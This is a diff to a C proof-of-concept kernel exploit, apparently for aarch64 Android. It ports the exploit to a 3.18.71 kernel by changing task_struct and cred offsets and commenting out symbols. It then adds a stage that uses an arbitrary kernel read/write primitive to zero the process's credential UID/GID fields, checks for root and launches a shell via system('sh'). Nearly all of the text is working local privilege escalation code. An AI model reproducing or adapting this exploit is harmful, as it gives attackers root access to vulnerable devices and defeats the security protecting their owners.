@@ -371,16 +371,19 @@ void kernel_write_uint(unsigned long kaddr, unsigned int data) {
   kernel_write(kaddr, &data, sizeof(data));
 }
 
-// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
-// data from `pahole` on my own build with the same .config
-#define OFFSET__task_struct__mm 0x520
-#define OFFSET__task_struct__cred 0x790
-#define OFFSET__mm_struct__user_ns 0x300
-#define OFFSET__uts_namespace__name__version 0xc7
+// $ uname -a
+// Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
+#define OFFSET__task_struct__stack 0x008
+//#define OFFSET__task_struct__comm 0x558 // not needed
+#define OFFSET__task_struct__cred 0x550
+
+//#define OFFSET__task_struct__mm 0x520
+//#define OFFSET__mm_struct__user_ns 0x300
+//#define OFFSET__uts_namespace__name__version 0xc7
 // SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
-#define SYMBOL__init_user_ns 0x202f2c8
-#define SYMBOL__init_task 0x20257d0
-#define SYMBOL__init_uts_ns 0x20255c0
+//#define SYMBOL__init_user_ns 0x202f2c8
+//#define SYMBOL__init_task 0x20257d0
+//#define SYMBOL__init_uts_ns 0x20255c0
 
 int main(int argc, char** argv) {
   printf("Starting POC\n");
@@ -406,7 +409,7 @@ int main(int argc, char** argv) {
   unsigned long const src=0xFFFFFFFFFFFFFFFEul;
   clobber_data(kstack+8, &src, 8);
   
-  printf("current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+8));
+  printf("current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__stack));
 
   free(leaked);
 
@@ -415,8 +418,26 @@ int main(int argc, char** argv) {
 
   char task_struct_data[0x1000];
   kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
-  hexdump_memory(task_struct_data, 0x1000);
+  printf("task_struct\n");
+  hexdump_memory(task_struct_data, sizeof(task_struct_data));
   printf("pid = %x\n", getpid());
+
+  printf("cred\n");
+  unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__cred);
+  char cred_data[0x200];
+  kernel_read(cred_ptr, cred_data, sizeof(cred_data));
+  hexdump_memory(cred_data, sizeof(cred_data));  
+  for (int i = 0; i < 8; i++)
+    kernel_write_uint(cred_ptr+4 + i*4, 0);
+
+  if (getuid() != 0) {
+    printf("Error changing our UID to root.\n");
+    exit(1);
+  }
+
+  printf("UIDs changed to root!\n");  
+  
+  system("sh");
   
 #if 0 // TODO
   /* in case you want to do stuff with the creds, to show that you can get them: */
